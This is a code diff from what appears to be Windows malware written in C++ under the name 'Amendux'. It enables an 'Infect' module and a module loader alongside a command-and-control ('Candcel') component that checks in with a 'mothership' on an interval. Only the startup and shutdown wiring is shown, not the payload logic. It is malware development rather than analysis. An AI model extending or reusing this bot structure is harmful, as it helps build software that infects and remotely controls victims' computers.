@@ -6,6 +6,8 @@
 #include "Config.h"
 #include "Process.h"
 #include "Candcel.h"
+#include "Infect.h"
+#include "ModuleLoader.h"
 #include "Resource.h"
 
 #define MAX_LOADSTRING 100
@@ -49,19 +51,19 @@ int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmd
         return false;
     }
 
-	// Initialize modules
+	// Initialize instance
 	Amendux::Log::Init();
 	Amendux::Config::Init();
 
 	// If anything failed at this moment, disengage
 	if (!Amendux::Config::Success()) {
-		goto TerminateInstance;
+		goto TerminateInstance;// TODO handle this via message loop
 	}
 
-	// Establish communications with mothership
+	// Run core classes
 	Amendux::Candcel::Init();
-	// Amendux::Infect::Init();
-	// Amendux::Module::Init();
+	Amendux::Infect::Init();
+	Amendux::ModuleLoader::Init();
 
 	// Launch the checkin process
 	Amendux::Candcel::SpawnInterval(&Commander);
@@ -81,6 +83,8 @@ int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmd
 TerminateInstance:
 
 	// Terminate modules in reverse order
+	Amendux::ModuleLoader::Terminate();
+	Amendux::Infect::Terminate();
 	Amendux::Candcel::Terminate();
 	Amendux::Config::Terminate();
 	Amendux::Log::Terminate();
